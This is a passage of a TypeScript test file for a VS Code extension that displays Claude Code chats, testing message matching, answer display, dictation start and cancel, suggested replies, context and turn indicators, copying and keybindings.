  assert.deepEqual([...pendingTaken([...items, you("b", "fix the parser", NOW + 300)], [sent(1, "fix  the\nparser", "sending")], NOW + 400, true)], [1]);
  assert.deepEqual([...pendingTaken([...items, you("b", "a long one\n…", NOW + 300)], [sent(1, "a long one with more", "sent")], NOW + 400, false)], [1]);
  // the same words as a prompt shown when it was sent aren't it
  assert.deepEqual([...pendingTaken(items, [sent(1, "hello", "sent")], NOW + 400, true)], []);
  // two the same and one new prompt: the first is it
  assert.deepEqual([...pendingTaken([...items, you("b", "go on", NOW + 1)], [sent(1, "go on", "sent"), sent(2, "go on", "sent")], NOW + 400, true)], [1]);
  // this computer's: after a moment, any new prompt (Claude changed its words); an SSH host's: its words only
  const changed = [...items, you("b", "[Image #1] look", NOW + 300)];
  assert.deepEqual([...pendingTaken(changed, [sent(1, "[Image: /tmp/a.png] look", "sent")], NOW + 1000, true)], []);
  assert.deepEqual([...pendingTaken(changed, [sent(1, "[Image: /tmp/a.png] look", "sent")], NOW + 4000, true)], [1]);
  assert.deepEqual([...pendingTaken(changed, [sent(1, "[Image: /tmp/a.png] look", "sent")], NOW + 4000, false)], []);
  // gone 30 s after it went, whatever the conversation shows
  assert.deepEqual([...pendingTaken(items, [sent(1, "x", "sent"), sent(2, "y", "sending")], NOW + 31000, false)], [1]);
  // held (sent while Claude works, not gone yet): never it, however long, whatever the conversation shows
  const held = { ...sent(3, "go on", "sent"), state: "held" as const, until: NOW + 5000 };
  assert.deepEqual([...pendingTaken([...items, you("b", "go on", NOW + 1)], [held], NOW + 60000, true)], []);

  assert.equal(stampFresher("120:5/120", "100:4/120", 120), true);
  assert.equal(stampFresher("100:4/120", "120:5/120", 120), false, "read before what's shown");
  assert.equal(stampFresher("200:9/120", "100:4/240", 240), false, "read for another length");
  assert.equal(stampFresher("100:4/240", "", 240), true);
});

// ---------------------------------------------------------------- your answers in the chat (A11)

test("your answer as the conversation will have it: the options, what you typed, one line a question; a plan's; a note", () => {
  const colour = { question: "Which colour?", header: "Colour", multiSelect: false, options: [{ label: "Teal", description: "" }] };
  const extras = { question: "Which extras?", header: "Extras", multiSelect: true, options: [{ label: "Basil", description: "" }, { label: "Figs, dried", description: "" }] };
  const ask = { questions: [colour] };
  assert.equal(answerText(ask, "answer", "", { "Which colour?": ["Teal"] }), "Teal");
  assert.equal(answerText(ask, "answer", "", { "Which colour?": [" a soft teal "] }), "a soft teal");
  // several: Header: answer, a line each (in the questions' order; a multi-select's joined as Claude's dialog joins them)
  assert.equal(answerText({ questions: [colour, extras] }, "answer", "", { "Which extras?": ["Basil", "Figs, dried", 'a "little" salt'], "Which colour?": ["Teal"] }),
               'Colour: Teal\nExtras: Basil, "Figs, dried", "a \\"little\\" salt"');
  assert.equal(joinAnswer(["Basil", "Figs, dried"], true), 'Basil, "Figs, dried"');
  assert.equal(joinAnswer(["Basil", "Honey"], false), "Basil");
  // declined with a note: the note; without one, nothing of yours
  assert.equal(answerText(ask, "deny", " ask me later "), "ask me later");
  assert.equal(answerText(ask, "deny", ""), "");
  // a plan
  const plan = { plan: { text: "# Plan", cut: false, file: "", title: "Plan" } };
  assert.equal(answerText(plan, "approve-edits", ""), "Approved the plan");
  assert.equal(answerText(plan, "keep", "fewer colours"), "Keep planning\nfewer colours");
  assert.equal(answerText(plan, "keep", ""), "Keep planning");
  // a permission: a Deny's note; Allow, Always allow and a plain Deny show nothing
  assert.equal(answerText({}, "deny", "use make instead"), "use make instead");
  assert.deepEqual(["allow", "always", "deny"].map((d) => answerText({}, d as "allow", "")), ["", "", ""]);
  assert.deepEqual([answerKind(ask), answerKind(plan), answerKind({})], ["question", "plan", "permission"]);
});

test("your answer shows at once till the conversation has it, after the call it answers; a question shows once answered", () => {
  const tool = (key: string, name: string, status: "open" | "ok" | "error") => ({ kind: "tool" as const, key, name, status, at: NOW });
  const items = [tool("t1", "AskUserQuestion", "ok"), tool("t2", "Bash", "open"), tool("t3", "AskUserQuestion", "open")];
  // its call: the one named, else its tool's newest open call
  assert.equal(answerFor(items, { tool: "AskUserQuestion", toolUse: "t1" }), "t1");
  assert.equal(answerFor(items, { tool: "AskUserQuestion", toolUse: null }), "t3");
  assert.equal(answerFor(items, { tool: "Edit", toolUse: "gone" }), "");
  const going = (id: number, forKey: string, state: "sending" | "sent", known: string[] = []) =>
    ({ id, text: "Teal", answered: "question" as const, at: NOW, for: forKey, known, state, sentAt: state === "sent" ? NOW : 0 });
  assert.deepEqual([...answersTaken(items, [going(1, "t3", "sending")], NOW + 100)], []);
  // its answer listed, or its call answered with nothing of yours to show
  const answer = { kind: "you" as const, key: "t3/answer", text: "Teal", at: NOW + 50, answered: "question" as const };
  assert.deepEqual([...answersTaken([...items, answer], [going(1, "t3", "sent")], NOW + 100)], [1]);
  assert.deepEqual([...answersTaken([items[0], items[1], tool("t3", "AskUserQuestion", "error")], [going(1, "t3", "sent")], NOW + 100)], [1]);
  // its call not known: an answer of yours that wasn't there
  assert.deepEqual([...answersTaken([...items, answer], [going(1, "", "sent", ["t3/answer"])], NOW + 100)], []);
  assert.deepEqual([...answersTaken([...items, answer], [going(1, "", "sent")], NOW + 100)], [1]);
  // gone 30 s after it went
  assert.deepEqual([...answersTaken(items, [going(1, "t3", "sent"), going(2, "t3", "sending")], NOW + 31000)], [1]);
  // an answer isn't a message you sent, nor one ↑ brings back
  assert.deepEqual([...pendingTaken([answer], [{ id: 5, text: "Teal", at: NOW, state: "sent", sentAt: NOW, known: [] }], NOW + 100, true)], []);
  assert.deepEqual(promptHistory([{ kind: "you", key: "p", text: "pick one", at: NOW }, answer], [], []), ["pick one"]);
  // the question shows as Claude's once answered (or as your answer goes); a failed one, a denied call don't
  const asked = (state: "open" | "answered" | "failed" | "denied" | "keep", plan = false) =>
    ({ ...tool("q", plan ? "ExitPlanMode" : "AskUserQuestion", "ok"), asked: plan ? { state, plan: "# P", title: "P" } : { state, questions: [] } });
  assert.deepEqual([asked("answered"), asked("open"), asked("failed")].map((it) => askedShows(it)), [true, false, false]);
  assert.equal(askedShows(asked("open"), true), true);
  assert.equal(askedShows(asked("keep", true)), true);
  assert.equal(askedShows({ ...tool("e", "Edit", "error"), asked: { state: "denied" } }), false);
  assert.equal(askedShows(tool("b", "Bash", "ok")), false);
});

test("an answer from a row or a notification shows at once in the chat's tab, and says when it went", async () => {
  const state = waitingState("hook");
  const row = state.status!.groups.flatMap((g) => g.sessions).find((x) => x.state === "waiting")!;
  const { p } = panes(state);
  const said: unknown[] = [];
  (p as unknown as { panes: Map<string, unknown> }).panes.set(`|${row.chatId || row.sessionId}`, { answering: (m: unknown) => said.push(m) });
  await p.answer(chatRefOf(row), "deny", shownAsk(row.permission), "use make");
  assert.deepEqual(said, [{ type: "answering", id: 1, ask: row.permission, decision: "deny", note: "use make" },
                          { type: "answered", id: 1, ok: true }]);
});

// ---------------------------------------------------------------- the microphone, starting

test("the microphone: no second recorder while one starts; one still starting when the tab closes, or × is pressed, is stopped", async () => {
  const calls: string[][] = [];
  let started: () => void = () => undefined;
  const backend = {
    pane: async () => ({ ok: true, unchanged: true }),
    dictate: (args: string[]) => {
      calls.push(args);
      if (args[0] === "--start") return new Promise((r) => (started = () => r({ ok: true, message: "Recording" })));
      return Promise.resolve(args[0] === "--status" ? { ok: true, tool: "/usr/bin/whisper-cli", model: "/m.bin" } : { ok: true, message: "" });
    },
  };
  const dash = { opened() {}, state: () => demoState(NOW), refresh: async () => undefined, pollHost: async () => undefined, onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, {} as never, { find: async () => undefined } as never, {} as never);
  const tick = () => new Promise((r) => setTimeout(r, 10));
  const tab = (id: string) => {
    p.open({ chatId: id, sessionId: id, profileDir: ".claude", name: "x" } as never);
    return recorded.panels.at(-1)!;
  };
  const told = (panel: { sent: unknown[] }) => panel.sent.filter((m) => (m as { type: string }).type === "dictation").map((m) => (m as { state: string }).state);

  let panel = tab("mic-2");
  panel.receive({ type: "dictate", action: "toggle" });
  await tick();
  panel.receive({ type: "dictate", action: "toggle" }); // (clicked again before it records)
  await tick();
  assert.deepEqual(calls.map((c) => c[0]), ["--status", "--start"]);
  started();
  await tick();
  assert.deepEqual(told(panel), ["starting", "starting", "recording"]);

  // the tab closes while it starts: stopped as soon as it has, its recording deleted
  calls.length = 0;
  panel = tab("mic-3");
  panel.receive({ type: "dictate", action: "toggle" });
  await tick();
  const id = calls[1][1];
  panel.dispose();
  started();
  await tick();
  assert.deepEqual(calls, [["--status"], ["--start", id], ["--cancel", id]]);

  // × while it starts: the same
  calls.length = 0;
  panel = tab("mic-4");
  panel.receive({ type: "dictate", action: "toggle" });
  await tick();
  const id2 = calls[1][1];
  panel.receive({ type: "dictate", action: "cancel" });
  await tick();
  started();
  await tick();
  assert.deepEqual(calls, [["--status"], ["--start", id2], ["--cancel", id2]]);
  assert.equal(told(panel).at(-1), "");
});

// ---------------------------------------------------------------- a tab closed while it works

test("a tab closed while it reads its chat, or looks up its row, does nothing more with it (no \"Webview is disposed\")", async () => {
  const rejections: unknown[] = [];
  const onRejection = (e: unknown) => void rejections.push(e);
  process.on("unhandledRejection", onRejection);
  try {
    const state = demoState(NOW);
    const row = state.status!.groups.flatMap((g) => g.sessions).find((s) => !!s.pid && s.entrypoint !== "claude-vscode" && s.kind !== "bg" && !s.tmux)!;
    assert.ok(row, "a row in a terminal (its terminal is looked up)");
    const calls: string[][] = [];
    let read: (answer: unknown) => void = () => undefined;
    let found: (t: undefined) => void = () => undefined;
    let lookUp = false;
    const backend = { pane: (args: string[]) => (calls.push(args), new Promise((r) => (read = r))) };
    const terminals = { find: () => (lookUp ? new Promise((r) => (found = r)) : Promise.resolve(undefined)) };
    const dash = { opened() {}, state: () => state, refresh: async () => undefined, pollHost: async () => undefined, onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
    const warnings: string[] = [];
    const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, { canMoveToClaudeCode: () => false } as never,
                            terminals as never, { warn: (m: string) => void warnings.push(m) } as never);
    const tick = () => new Promise((r) => setTimeout(r, 10));

    // closed while its conversation is read
    p.open(chatRefOf(row));
    let panel = recorded.panels.at(-1)!;
    panel.show(true);
    panel.receive({ type: "ready" });
    await tick();
    assert.equal(calls.length, 1);
    panel.dispose();
    read({ ok: true, items: [], stamp: "s1" });
    await tick();
    // closed while its row's terminal is looked up
    lookUp = true;
    p.open(chatRefOf(row));
    panel = recorded.panels.at(-1)!;
    panel.show(true);
    panel.receive({ type: "ready" });
    await tick();
    panel.dispose();
    found(undefined);
    await new Promise((r) => setTimeout(r, 1600)); // (past when the next read would come)
    assert.equal(calls.length, 1, "nothing read after it closed");
    // closed while its review is read: what comes back goes nowhere
    lookUp = false;
    p.open(chatRefOf(row));
    panel = recorded.panels.at(-1)!;
    panel.receive({ type: "review" });
    await tick();
    assert.deepEqual(calls.at(-1)?.slice(0, 2), ["--review", row.chatId || row.sessionId]);
    panel.dispose();
    read({ ok: true, message: "", files: [], tests: null, editedAt: null, repos: [] });
    await tick();
    assert.deepEqual(warnings, []);
    assert.deepEqual(rejections, []);
  } finally {
    process.off("unhandledRejection", onRejection);
  }
});

test("suggested replies: Claude's question's chips first, then your usual ones after a turn that ended so, at most 4", () => {
  const yesno: Asks = { kind: "yesno", choices: [{ label: "Yes", send: "Yes", recommended: false }, { label: "No", send: "No", recommended: false }] };
  const usual: UsualReplies = { chips: { asked: ["yes please", "Yes.", "go"], limit: ["continue"] }, ranked: ["continue", "commit and push", "yes please"] };
  const chips = chipsOf(yesno, "asked", usual);
  assert.deepEqual(chips.map((c) => [c.label, c.send, c.usual]), [["Yes", "Yes", false], ["No", "No", false], ["yes please", "yes please", true], ["go", "go", true]]);
  assert.match(chips[0].title, /Answers Claude's question with “Yes” \(Alt\+1\)/);
  assert.match(chips[3].title, /Your usual reply after Claude's questions: sends “go” \(Alt\+4\).*don't suggest it again/);
  // after a usage limit: only yours; one you hid isn't there
  assert.deepEqual(chipsOf(null, "limit", usual).map((c) => c.send), ["continue"]);
  assert.deepEqual(chipsOf(null, "limit", usual, new Set([replyKey("Continue!")])), []);
  assert.deepEqual(chipsOf(null, "finished", null), []);
  // six options: the one Claude recommends stays, with the first ones, in their order
  const six: Asks = { kind: "options", choices: [1, 2, 3, 4, 5, 6].map((n) => ({ label: `${n} · Step ${n}`, send: `${n}. Step ${n}`, recommended: n === 6 })) };
  const shown = chipsOf(six, "asked", usual);
  assert.deepEqual(shown.map((c) => c.send), ["1. Step 1", "2. Step 2", "3. Step 3", "6. Step 6"]);
  assert.ok(shown[3].recommended && /recommends this one/.test(shown[3].title));
});

test("suggested replies show once Claude's turn is over and the box is empty, never while it works or asks", () => {
  const now = 1_000_000;
  const base = { on: true, fresh: false, ended: "asked" as const, over: true, state: "done", text: "", pending: false, resting: false, sentAt: 0 };
  assert.equal(chipsWanted(base, now), true);
  assert.equal(chipsWanted({ ...base, state: "working" }, now), true);       // (the transcript says it's over: the row comes a moment later)
  for (const no of [{ on: false }, { fresh: true }, { ended: null }, { text: "c" }, { pending: true }, { resting: true }, { state: "waiting" }])
    assert.equal(chipsWanted({ ...base, ...no } as typeof base, now), false, JSON.stringify(no));
  // not said by the transcript (your prompt with no reply): the chat's state, not just after you sent something
  const open = { ...base, ended: "stopped" as const, over: false };
  assert.equal(chipsWanted({ ...open, state: "working" }, now), false);
  assert.equal(chipsWanted(open, now), true);
  assert.equal(chipsWanted({ ...open, sentAt: now - 2000 }, now), false);
});

test("suggested replies back off: five sends in a row with chips and none of them, then none for a while", () => {
  const chips = chipsOf(null, "limit", { chips: { limit: ["continue"] }, ranked: [] });
  let state = { ignored: 0, restUntil: 0 };
  for (let i = 1; i < CHIPS_IGNORED; i++) {
    state = chipsAfterSend(state.ignored, chips, "something else", 0);
    assert.deepEqual(state, { ignored: i, restUntil: 0 });
  }
  assert.deepEqual(chipsAfterSend(state.ignored, chips, "Continue.", 0), { ignored: 0, restUntil: 0 });   // (typed as a chip says: used)
  assert.deepEqual(chipsAfterSend(CHIPS_IGNORED - 1, chips, "no", 5), { ignored: 0, restUntil: 5 + CHIPS_REST_MS });
  assert.deepEqual(chipsAfterSend(3, [], "no", 5), { ignored: 3, restUntil: 0 });   // (none showed: nothing counts)
});

test("context left in the header, and Claude's turn so far on the working line (Plasma's words)", () => {
  const c = { used: 300000, window: 1000000, compactAt: 967000, left: 69, near: false };
  assert.equal(contextText(c), "Context 69% left");
  assert.equal(contextHint(c), "300.0k of its 1.0M tokens of context are used. Claude compacts the chat on its own at about 967.0k: it sums up the conversation so far and goes on from that.");
  assert.match(contextHint({ ...c, left: 2, near: true }), / That's soon: run \/compact now to say what it keeps, if you'd rather choose\.$/);
  const t = { startedAt: 1_000_000, steps: 12 };
  assert.equal(turnText(t, 1_000_000 + 9_400), "9s · 12 steps");
  assert.equal(turnText({ ...t, steps: 1 }, 1_000_000 + 4 * 60000 + 59_000), "4m · 1 step");
  assert.equal(turnText({ ...t, steps: 0 }, 1_000_000 + 65 * 60000), "1h 5m");
  assert.equal(turnText(t, 1_000_000 - 5000), "0s · 12 steps");   // (a host's clock a little ahead)
  assert.equal(turnHint(t, 1_000_000 + 125_000), "Claude's turn so far: 2m since your message, 12 steps (its tool calls, in the Steps tab).");
  // the next change: the next second for its first minute, then the next minute
  assert.equal(turnTickIn(t, 1_000_000 + 9_400), 600);
  assert.equal(turnTickIn(t, 1_000_000 + 59_999), 1);
  assert.equal(turnTickIn(t, 1_000_000 + 60_000), 60000);
  assert.equal(turnTickIn(t, 1_000_000 + 4 * 60000 + 59_000), 1000);
});

test("completion as you type: the rest of your usual reply that starts so, this turn's kind first", () => {
  const usual: UsualReplies = { chips: { limit: ["carry on"] }, ranked: ["continue", "commit and push", "Go on"] };
  assert.equal(completionOf("co", usual), "ntinue");
  assert.equal(completionOf("Comm", usual), "it and push");
  assert.equal(completionOf("c", usual, "limit"), "arry on");
  assert.equal(completionOf("go", usual), " on");
  for (const none of ["", "  ", "continue", "x", "/co", "!co", "co\nmore"]) assert.equal(completionOf(none, usual), "", none);
  assert.equal(completionOf("co", null), "");
  assert.equal(completionOf("co", usual, null, new Set(["continue"])), "mmit and push");
});

test("times: a line before each new day (none before the first; Today, Yesterday, Mon 3 Nov, the year when not this one), a message's time on hover", () => {
  const at = (day: number, h: number, m = 0, month = 10, year = 2026) => new Date(year, month, day, h, m).getTime();
  const now = at(5, 15);
  assert.equal(dayLabel(at(5, 0, 1), now), "Today");
  assert.equal(dayLabel(at(4, 23, 59), now), "Yesterday");
  assert.equal(dayLabel(at(5, 15, 5), now), "Today");   // (a host's clock a little ahead)
  const nov3 = new Date(2026, 10, 3, 9);
  assert.equal(dayLabel(nov3.getTime(), now), nov3.toLocaleDateString([], { weekday: "short", day: "numeric", month: "short" }));
  assert.doesNotMatch(dayLabel(nov3.getTime(), now), /2026/);
  assert.match(dayLabel(at(31, 9, 0, 11, 2025), now), /2025/);
  assert.equal(timeText(at(5, 9, 30), now), clockText(at(5, 9, 30)));
  assert.equal(timeText(at(4, 22), now), `Yesterday ${clockText(at(4, 22))}`);
  assert.equal(timeText(nov3.getTime(), now), `${dayLabel(nov3.getTime(), now)} ${clockText(nov3.getTime())}`);
  // a line before the first item of each later day; none before the first item, nor for items with no
  // time, nor for one listed after a later day (a message still queued: the time you sent it)
  const items = [
    { kind: "you" as const, key: "a", at: at(3, 23, 50) },
    { kind: "tool" as const, key: "b", at: at(3, 23, 59) },
    { kind: "tool" as const, key: "c", at: at(4, 0, 2) },
    { kind: "claude" as const, key: "d", at: at(4, 0, 5) },
    { kind: "note" as const, key: "e", at: null },
    { kind: "you" as const, key: "f", at: at(5, 9) },
    { kind: "claude" as const, key: "g", at: at(5, 9, 1) },
    { kind: "you" as const, key: "h", at: at(4, 23), queued: true },
  ];
  assert.deepEqual([...dayBreaks(items, true)], ["c", "f"]);
  assert.deepEqual([...dayBreaks(items, false)], ["d", "f"]);   // (Chat: before the day's first item it shows)
  assert.deepEqual([...dayBreaks(items.slice(2), true)], ["f"]);
  assert.deepEqual([...dayBreaks([{ kind: "you", key: "x", at: null }, ...items.slice(5)], true)], []);
  // (a day of tool calls only: a line on Steps, none on Chat)
  const night = [items[0], { kind: "tool" as const, key: "n", at: at(4, 1) }, items[5]];
  assert.deepEqual([...dayBreaks(night, true)], ["n", "f"]);
  assert.deepEqual([...dayBreaks(night, false)], ["f"]);
});

test("Copy on a message: Claude's reply as Markdown, yours as you typed it, a command too; nothing for the rest", () => {
  const md = "Found it: `isoWeek` caps weeks at 52.\n\n## What changes\n\n1. Use `weeksInYear(date)`\n\n```ts\nreturn 1;\n```";
  assert.equal(copyText({ kind: "claude", key: "m", text: md, at: 1 }), md);
  assert.equal(copyText({ kind: "you", key: "u", text: "[Image: /tmp/a.png] look at this", at: 1 }), "[Image: /tmp/a.png] look at this");
  assert.equal(copyText({ kind: "you", key: "c", text: "!ls src", at: 1, command: { shell: true, output: "a\nb" } }), "!ls src");
  assert.equal(copyText({ kind: "you", key: "c", text: "/model fable", at: 1, command: {} }), "/model fable");
  assert.equal(copyText({ kind: "tool", key: "t", name: "Bash", line: "Bash: ls", output: "a", at: 1 }), "");
  assert.equal(copyText({ kind: "note", key: "n", text: "Interrupted", at: 1 }), "");
});

test("the new-messages badge: what came in below since you scrolled up, as its tab shows it", () => {
  const seen = new Set(["u1", "m1", "t1"]);
  const items = [
    { kind: "you" as const, key: "u1", text: "Fix it", at: 1 },
    { kind: "claude" as const, key: "m1", text: "On it", at: 2 },
    { kind: "tool" as const, key: "t1", name: "Read", at: 3 },
    { kind: "tool" as const, key: "t2", name: "Bash", at: 4 },
    { kind: "tool" as const, key: "t3", name: "Edit", at: 5, asked: { state: "denied" as const } },
    { kind: "tool" as const, key: "q1", name: "AskUserQuestion", at: 6, asked: { state: "answered" as const, questions: [] } },
    { kind: "you" as const, key: "q1/answer", text: "ISO weeks", answered: "question" as const, at: 7 },
    { kind: "claude" as const, key: "m2", text: "Done", at: 8 },
  ];
  assert.equal(newBelow(seen, items, false), 4);   // (Chat: not the tool calls, but a denied one and a question)
  assert.equal(newBelow(seen, items, true), 5);
  assert.equal(newBelow(new Set(items.map((it) => it.key)), items, true), 0);
  // (Show earlier meanwhile: those came in above, not below)
  const earlier = [{ kind: "you" as const, key: "u0", text: "Before", at: 0 }, { kind: "claude" as const, key: "m0", text: "Sure", at: 0 }];
  assert.equal(newBelow(seen, [...earlier, ...items], false), 4);
  assert.equal(newBelow(seen, [...earlier, ...items.slice(0, 3)], false), 0);
  assert.equal(newBelow(seen, earlier, true), 0);   // (none of those there then: nothing to tell)
  assert.equal(newText(3), "3 new");
  assert.equal(newHint(1), "One new item below, since you scrolled up. Click to go to the end.");
  assert.equal(newHint(4), "4 new items below, since you scrolled up. Click to go to the end.");
});

// Talpy Chat's keys (A10): one table for the ? list and the tooltips (keys.mjs, the
// widget's too); each action is a command whose key applies only while a chat tab has
// the focus (not with it in the terminal or the side bar: editorAreaFocus)
test("the keys table: each command's key is its default keybinding, in a chat tab only", async () => {
  const fs = await import("node:fs");
  const manifest = JSON.parse(fs.readFileSync("package.json", "utf8"));
  const bindings: { command: string; key: string; mac?: string; when?: string }[] = manifest.contributes.keybindings;
  const commands = new Set((manifest.contributes.commands as { command: string }[]).map((c) => c.command));
  assert.equal(new Set(KEYS.map((k) => k.id)).size, KEYS.length);
  const named = new Set<string>();
  for (const k of KEYS) {
    assert.ok(KEY_GROUPS.includes(k.group), k.id);
    assert.ok(k.what && (k.plasma || k.vscode), k.id);
    for (const [command, key] of k.commands ?? []) {
      named.add(command);
      assert.ok(commands.has(command), `${command} is a command`);
      const b = bindings.find((x) => x.command === command);
      assert.ok(b, `${command} has a key`);
      assert.equal(b!.key, key);
      assert.equal(b!.mac, key.replace(/ctrl\+/g, "cmd+"));
      if (command.startsWith("talpyDen.chat.")) assert.equal(b!.when, "activeWebviewPanelId == 'talpyDen.chat' && editorAreaFocus", command);
    }
  }
  // (each of the tab's commands is in the table, but Stop and the list itself: Esc and ? are the page's)
  for (const c of commands) if (c.startsWith("talpyDen.chat.")) assert.ok(named.has(c) || ["talpyDen.chat.stop", "talpyDen.chat.keys"].includes(c), c);
  // (in the command palette only where they act)
  const palette: { command: string; when: string }[] = manifest.contributes.menus.commandPalette;
  for (const c of commands) if (c.startsWith("talpyDen.chat.")) assert.equal(palette.find((m) => m.command === c)?.when, "activeWebviewPanelId == 'talpyDen.chat'", c);
  assert.equal(keyText("sendNow", "vscode"), "Ctrl+Enter");
  assert.equal(keyText("sendNow", "vscode", true), "Cmd+Enter");
  assert.equal(withKey("Send now", "sendNow", "plasma"), "Send now (Ctrl+Enter)");
  assert.equal(withKey("Your other windows", "chats", "vscode"), "Your other windows");   // (none there: VS Code's own)
});

test("Esc does the nearest thing first, one thing a press: Stop only once nothing is open", () => {
  assert.equal(escTarget({ menu: true, big: true, list: true, help: true, ghost: true, stop: true }), "menu");
  assert.equal(escTarget({ big: true, list: true, stop: true }), "big");
  assert.equal(escTarget({ list: true, help: true, stop: true }), "list");
  assert.equal(escTarget({ help: true, ghost: true, stop: true }), "help");
  assert.equal(escTarget({ ghost: true, stop: true }), "ghost");
  assert.equal(escTarget({ stop: true }), "stop");
  assert.equal(escTarget({ stop: false }), "");
  assert.equal(escTarget({}), "");
  assert.deepEqual([...ESC_ORDER], ["menu", "big", "list", "find", "help", "ghost", "stop"]);
});

test("a key's command goes to the chat tab in front, and only to it", async () => {
  const dash = { opened() {}, state: () => demoState(NOW), refresh: async () => undefined, pollHost: async () => undefined, onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, { pane: async () => ({ ok: true, unchanged: true }) } as never, dash as never, {} as never,
                          { find: async () => undefined } as never, {} as never);
  p.open({ chatId: "k-1", sessionId: "k-1", profileDir: ".claude", name: "one" } as never);
  const one = recorded.panels.at(-1)!;
  p.open({ chatId: "k-2", sessionId: "k-2", profileDir: ".claude", name: "two" } as never);
  const two = recorded.panels.at(-1)!;
  one.receive({ type: "ready" });
  two.receive({ type: "ready" });
  await new Promise((r) => setTimeout(r, 10));
  const keys = (panel: typeof one) => panel.sent.filter((m) => (m as { type: string }).type === "key");
  assert.equal(p.key("sendNow"), false, "none in front");
  two.activate(true);
  assert.equal(p.key("sendNow"), true);
  assert.deepEqual(keys(two), [{ type: "key", key: "sendNow" }]);
  assert.deepEqual(keys(one), []);
  two.dispose();
  one.activate(true);
  p.key("copyLast");
  assert.deepEqual(keys(one), [{ type: "key", key: "copyLast" }]);
  p.dispose();
});

test("Copy copies all of it: a reply shown cut is read whole first, and Copied is said once it's on the clipboard", async () => {
  const state = demoState(NOW);
  const answers: Record<string, unknown> = { ok: true, text: "the whole reply, all 30000 characters of it" };
  const calls: string[][] = [];
  const backend = { pane: async (args: string[]) => (calls.push(own(args)), args[0] === "--reply-text" ? answers : { ok: true, unchanged: true }) };
  const dash = { opened() {}, state: () => state, refresh: async () => undefined, pollHost: async () => undefined, onState: () => ({ dispose() {} }), onLive: () => ({ dispose() {} }), liveHook: false };
  const p = new ChatPanes(vscode.Uri.file("/ext") as never, backend as never, dash as never, {} as never, { find: async () => undefined } as never, {} as never);
  p.open({ chatId: "copy-1", sessionId: "copy-1", profileDir: ".claude-work", name: "x" } as never);
  const panel = recorded.panels.at(-1)!;
  const copied = () => panel.sent.filter((m) => (m as { type: string }).type === "copied");
  const done = () => new Promise((r) => setTimeout(r, 10));
  panel.receive({ type: "copyItem", id: 1, key: "m1", text: "A short reply." });
  await done();
  assert.equal(clipboardWrites.at(-1), "A short reply.");
  assert.deepEqual(copied(), [{ type: "copied", id: 1, ok: true, message: "" }]);
  assert.deepEqual(calls.filter((c) => c[0] === "--reply-text"), [], "not cut: as shown");
  panel.receive({ type: "copyItem", id: 2, key: "m2", text: "Lorem ipsum…\n…" });
  await done();
  assert.deepEqual(calls.filter((c) => c[0] === "--reply-text"), [["--reply-text", "copy-1", "--key", "m2", "--profile", ".claude-work"]]);
  assert.equal(clipboardWrites.at(-1), "the whole reply, all 30000 characters of it");
  assert.deepEqual(copied().at(-1), { type: "copied", id: 2, ok: true, message: "" });
  // (it can't be read: nothing copied, and it says why)
  Object.assign(answers, { ok: false, text: undefined, message: "That message isn't in the chat any more" });
  panel.receive({ type: "copyItem", id: 3, key: "m3", text: "cut\n…" });
  await done();
  assert.equal(clipboardWrites.at(-1), "the whole reply, all 30000 characters of it");
  assert.deepEqual(copied().at(-1), { type: "copied", id: 3, ok: false, message: "Couldn't copy all of it: That message isn't in the chat any more" });
  assert.equal(copyCut("cut\n…"), true);
  assert.equal(copyCut("Wait…"), false);
  assert.equal(lastReply([{ kind: "claude", key: "m1", text: "one", at: 1 }, { kind: "you", key: "u2", text: "two", at: 2 },
                          { kind: "claude", key: "m3", text: "three", at: 3 }, { kind: "tool", key: "t4", name: "Bash", at: 4 }])?.key, "m3");
  assert.equal(lastReply([{ kind: "you", key: "u2", text: "two", at: 2 }]), null);
  p.dispose();
});
